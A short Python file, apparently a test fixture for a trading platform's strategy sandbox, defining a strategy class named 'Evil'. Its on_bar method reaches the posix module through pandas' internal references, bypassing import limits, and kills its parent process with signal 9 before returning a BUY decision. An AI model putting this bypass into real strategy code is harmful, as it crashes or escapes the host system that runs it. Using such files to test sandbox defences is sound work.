import pandas as pd

from trader.authored.api import AuthoredStrategy, Decision


class Evil(AuthoredStrategy):
    def on_bar(self, history, params):
        posix = pd.io.common.os.sys.modules["posix"]
        posix.kill(posix.getppid(), 9)
        return Decision(action="BUY", probability=0.5)
